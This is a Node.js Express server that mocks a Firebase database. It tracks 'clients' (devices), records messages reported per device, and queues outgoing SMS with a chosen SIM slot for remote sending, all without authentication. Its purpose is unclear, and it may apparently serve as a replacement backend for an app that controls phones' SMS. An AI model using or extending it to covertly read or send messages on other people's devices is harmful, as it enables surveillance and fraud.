const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;

// ---------- Paths ----------
const DATA_DIR = path.join(__dirname, 'data');
const PUBLIC_DIR = path.join(__dirname, 'public');
const DEVICES_FILE = path.join(DATA_DIR, 'clients.json');    // matches Firebase key "clients"
const MESSAGES_FILE = path.join(DATA_DIR, 'messages.json');

// ---------- Ensure directories ----------
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(PUBLIC_DIR)) fs.mkdirSync(PUBLIC_DIR, { recursive: true });

// ---------- Init JSON files ----------
const initFile = (file, defaultData) => {
  if (!fs.existsSync(file)) {
    fs.writeFileSync(file, JSON.stringify(defaultData, null, 2));
  }
};
initFile(DEVICES_FILE, {});
initFile(MESSAGES_FILE, {});

// ---------- Helpers ----------
const readJSON = (file) => {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch { return {}; }
};
const writeJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// ---------- Middleware ----------
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// ---------- Static files ----------
app.use(express.static(PUBLIC_DIR));

// ============================================
//   FIREBASE‑MOCK ENDPOINTS
// ============================================

// Helper to strip query string (auth, etc.)
const stripQuery = (url) => url.split('?')[0];

// ---------- GET /clients.json ----------
app.get('/clients.json', (req, res) => {
  try {
    const clients = readJSON(DEVICES_FILE);
    res.json(clients);
  } catch (err) {
    res.status(500).json({ error: 'Failed to read clients' });
  }
});

// ---------- GET /clients/{id}.json ----------
app.get('/clients/:id.json', (req, res) => {
  try {
    const clients = readJSON(DEVICES_FILE);
    const device = clients[req.params.id];
    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }
    res.json(device);
  } catch (err) {
    res.status(500).json({ error: 'Failed to read device' });
  }
});

// ---------- PUT /clients/{id}.json (update device) ----------
app.put('/clients/:id.json', (req, res) => {
  try {
    const id = req.params.id;
    const clients = readJSON(DEVICES_FILE);
    clients[id] = { ...clients[id], ...req.body, id, updatedAt: Date.now() };
    writeJSON(DEVICES_FILE, clients);
    res.json(clients[id]);
  } catch (err) {
    res.status(500).json({ error: 'Failed to update device' });
  }
});

// ---------- DELETE /clients/{id}.json ----------
app.delete('/clients/:id.json', (req, res) => {
  try {
    const id = req.params.id;
    const clients = readJSON(DEVICES_FILE);
    if (!clients[id]) {
      return res.status(404).json({ error: 'Device not found' });
    }
    delete clients[id];
    writeJSON(DEVICES_FILE, clients);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Failed to delete device' });
  }
});

// ---------- PUT /clients/{id}/webhookEvent/sendSms.json ----------
app.put('/clients/:id/webhookEvent/sendSms.json', (req, res) => {
  try {
    const deviceId = req.params.id;
    const smsData = req.body;

    // Store the SMS in a local outbox (optional)
    const outboxFile = path.join(DATA_DIR, 'outbox.json');
    let outbox = readJSON(outboxFile);
    if (!outbox[deviceId]) outbox[deviceId] = [];
    const entry = {
      id: uuidv4(),
      to: smsData.to || smsData.phoneNumber,
      message: smsData.message || smsData.messageText,
      simSlot: smsData.simSlot || '1',
      status: 'queued',
      timestamp: Date.now(),
      dateTime: new Date().toISOString()
    };
    outbox[deviceId].push(entry);
    writeJSON(outboxFile, outbox);

    // Also store as a message
    const messages = readJSON(MESSAGES_FILE);
    if (!messages[deviceId]) messages[deviceId] = [];
    messages[deviceId].push({
      sender: '📤 Device',
      message: `To: ${entry.to}\n${entry.message}`,
      dateTime: entry.dateTime,
      timestamp: entry.timestamp,
      type: 'outgoing'
    });
    writeJSON(MESSAGES_FILE, messages);

    // Simulate sent after 2s
    setTimeout(() => {
      const updated = readJSON(outboxFile);
      if (updated[deviceId]) {
        const found = updated[deviceId].find(e => e.id === entry.id);
        if (found) found.status = 'sent';
        writeJSON(outboxFile, updated);
      }
    }, 2000);

    res.json({ success: true, entry });
  } catch (err) {
    res.status(500).json({ error: 'Failed to send SMS: ' + err.message });
  }
});

// ---------- GET /messages/{deviceId}.json ----------
app.get('/messages/:deviceId.json', (req, res) => {
  try {
    const deviceId = req.params.deviceId;
    const messages = readJSON(MESSAGES_FILE);
    const deviceMessages = messages[deviceId] || [];
    // Return latest 150
    const sorted = deviceMessages.sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
    const latest = sorted.slice(-150);
    res.json(latest);
  } catch (err) {
    res.status(500).json({ error: 'Failed to read messages' });
  }
});

// ---------- POST /messages/{deviceId}.json (add a message) ----------
app.post('/messages/:deviceId.json', (req, res) => {
  try {
    const deviceId = req.params.deviceId;
    const { sender, message, dateTime, type } = req.body;
    if (!message) {
      return res.status(400).json({ error: 'Message text required' });
    }
    const messages = readJSON(MESSAGES_FILE);
    if (!messages[deviceId]) messages[deviceId] = [];
    const entry = {
      sender: sender || 'Unknown',
      message,
      dateTime: dateTime || new Date().toISOString(),
      timestamp: Date.now(),
      type: type || 'incoming'
    };
    messages[deviceId].push(entry);
    writeJSON(MESSAGES_FILE, messages);
    res.json({ success: true, entry });
  } catch (err) {
    res.status(500).json({ error: 'Failed to add message' });
  }
});

// ---------- Also handle the "sendSms" direct endpoint (used by some calls) ----------
app.post('/sendSms/:deviceId', (req, res) => {
  // Redirect to the webhook style
  req.url = `/clients/${req.params.deviceId}/webhookEvent/sendSms.json`;
  app.handle(req, res);
});

// ---------- Fallback for SPA ----------
app.get('*', (req, res) => {
  // If it's an API call we didn't catch, return 404
  if (req.path.startsWith('/') && req.path.includes('.json')) {
    return res.status(404).json({ error: 'Endpoint not found' });
  }
  res.sendFile(path.join(PUBLIC_DIR, 'index.html'));
});

// ---------- Start server ----------
app.listen(PORT, () => {
  console.log(`\n🚀 Firebase‑Mock Server running on http://localhost:${PORT}`);
  console.log(`📡 Use this URL as "Firebase URL" and any dummy key.\n`);
});
